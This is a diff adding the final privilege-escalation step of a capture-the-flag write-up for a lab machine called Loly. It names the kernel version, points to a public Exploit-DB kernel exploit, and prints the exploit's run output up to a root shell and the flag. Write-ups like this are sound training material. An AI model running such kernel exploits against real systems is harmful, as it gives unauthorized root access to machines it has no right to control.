@@ -119,13 +119,40 @@ then i enumerated afew things that led to nothing, but a kernel exploit can be u
 
 ```bash
 loly@ubuntu: uname -a
+Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
+there is a exploit for this kernel [here](https://www.exploit-db.com/exploits/45010), upload it, compile it and you will get the root
 
 
+```bash
+loly@ubuntu:/tmp$ ./a.out 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff880034de9a00
+[*] Leaking sock struct from ffff880078815280
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff880076d75740
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff880076d75740
+[*] credentials patched, launching shell...
 
+# cat root.txt
+  ____               ____ ____  ____  
+ / ___| _   _ _ __  / ___/ ___||  _ \ 
+ \___ \| | | | '_ \| |   \___ \| |_) |
+  ___) | |_| | | | | |___ ___) |  _ < 
+ |____/ \__,_|_| |_|\____|____/|_| \_\
+                                      
+Congratulations. I'm BigCityBoy
+```
 
-
-
-
+this is how you can get root on this machine :)
 
